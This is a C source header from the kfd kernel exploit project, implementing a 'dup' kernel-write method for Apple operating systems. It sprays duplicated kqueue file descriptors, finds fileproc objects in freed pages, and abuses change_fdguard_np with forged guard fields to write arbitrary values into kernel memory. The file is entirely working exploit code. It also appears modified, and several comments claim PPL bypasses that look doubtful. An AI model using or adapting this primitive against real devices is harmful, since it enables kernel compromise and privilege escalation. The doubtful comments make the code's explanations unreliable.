/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kwrite_dup_h
#define kwrite_dup_h

void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_dup_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = ((kfd->kwrite.krkw_maximum_id + 1) * (sizeof(i32)));
    kfd->kwrite.krkw_method_data = malloc_bzero(kfd->kwrite.krkw_method_data_size);

    i32 kqueue_fd = kqueue();
    assert(kqueue_fd > 0);

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    fds[kfd->kwrite.krkw_maximum_id] = kqueue_fd;
}

void kwrite_dup_allocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kqueue_fd = fds[kfd->kwrite.krkw_maximum_id];
    i32 fd = dup(kqueue_fd);
    assert(fd > 0);
    fds[id] = fd;
}

bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);

    /*
     * On arm64e PUAF pages are PPL-owned — direct struct access crashes.
     * Read all fields via vm_read_overwrite to bypass pmap restrictions.
     */
    u32 fp_iocount = 0, fp_vflags = 0, fp_flags = 0, fp_guard_attrs = 0;
    u64 fp_glob = 0, fp_guard = 0;

    vm_size_t br = 0;
    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_iocount),    sizeof(u32), (vm_address_t)(&fp_iocount),    &br) != KERN_SUCCESS) return false;
    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_vflags),    sizeof(u32), (vm_address_t)(&fp_vflags),    &br) != KERN_SUCCESS) return false;
    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_flags),     sizeof(u32), (vm_address_t)(&fp_flags),     &br) != KERN_SUCCESS) return false;
    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_guard_attrs),sizeof(u32),(vm_address_t)(&fp_guard_attrs),&br) != KERN_SUCCESS) return false;
    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_glob),      sizeof(u64), (vm_address_t)(&fp_glob),      &br) != KERN_SUCCESS) return false;
    if (vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_guard),     sizeof(u64), (vm_address_t)(&fp_guard),     &br) != KERN_SUCCESS) return false;

    if ((fp_iocount == 1) &&
        (fp_vflags == 0) &&
        (fp_flags == 0) &&
        (fp_guard_attrs == 0) &&
        (fp_glob > PTR_MASK) &&
        (fp_guard == 0)) {
        for (u64 object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
            assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));

            u32 new_fp_flags = 0;
            vm_read_overwrite(mach_task_self(), object_uaddr + offsetof(struct fileproc, fp_flags),
                              sizeof(u32), (vm_address_t)(&new_fp_flags), &br);

            if (new_fp_flags == 1) {
                kfd->kwrite.krkw_object_id = object_id;
                return true;
            }

            assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
        }

        print_warning("failed to find modified fp_flags sentinel");
    }

    return false;
}

void kwrite_dup_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_dup_kwrite_u64);
}

void kwrite_dup_find_proc(struct kfd* kfd)
{
    return;
}

void kwrite_dup_deallocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    assert_bsd(close(fds[id]));
}

void kwrite_dup_free(struct kfd* kfd)
{
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}

/*
 * 64-bit kwrite function.
 * Uses vm_write to modify fileproc fields — bypasses PPL pmap restrictions.
 */
void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    if (new_value == 0) {
        print_warning("cannot write 0");
        return;
    }

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kwrite_fd = fds[kfd->kwrite.krkw_object_id];
    u64 fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;

    const bool allow_retry = false;

    do {
        u64 old_value = 0;
        kread((u64)(kfd), kaddr, &old_value, sizeof(old_value));

        if (old_value == 0) {
            print_warning("cannot overwrite 0");
            return;
        }

        if (old_value == new_value) {
            break;
        }

        /*
         * Read current fp_guard_attrs and fp_guard via vm_read_overwrite,
         * then write new values via vm_write — PPL-safe on arm64e.
         */
        vm_size_t br = 0;
        u32 old_fp_guard_attrs = 0;
        vm_read_overwrite(mach_task_self(),
                          fileproc_uaddr + offsetof(struct fileproc, fp_guard_attrs),
                          sizeof(u32), (vm_address_t)(&old_fp_guard_attrs), &br);

        u64 old_fp_guard = 0;
        vm_read_overwrite(mach_task_self(),
                          fileproc_uaddr + offsetof(struct fileproc, fp_guard),
                          sizeof(u64), (vm_address_t)(&old_fp_guard), &br);

        u32 new_fp_guard_attrs = GUARD_REQUIRED;
        vm_write(mach_task_self(),
                 fileproc_uaddr + offsetof(struct fileproc, fp_guard_attrs),
                 (vm_offset_t)(&new_fp_guard_attrs), sizeof(u32));

        u64 new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);
        vm_write(mach_task_self(),
                 fileproc_uaddr + offsetof(struct fileproc, fp_guard),
                 (vm_offset_t)(&new_fp_guard), sizeof(u64));

        u64 guard = old_value;
        u32 guardflags = GUARD_REQUIRED;
        u64 nguard = new_value;
        u32 nguardflags = GUARD_REQUIRED;

        if (allow_retry) {
            syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL);
        } else {
            assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
        }

        vm_write(mach_task_self(),
                 fileproc_uaddr + offsetof(struct fileproc, fp_guard_attrs),
                 (vm_offset_t)(&old_fp_guard_attrs), sizeof(u32));
        vm_write(mach_task_self(),
                 fileproc_uaddr + offsetof(struct fileproc, fp_guard),
                 (vm_offset_t)(&old_fp_guard), sizeof(u64));
    } while (allow_retry);
}

#endif /* kwrite_dup_h */
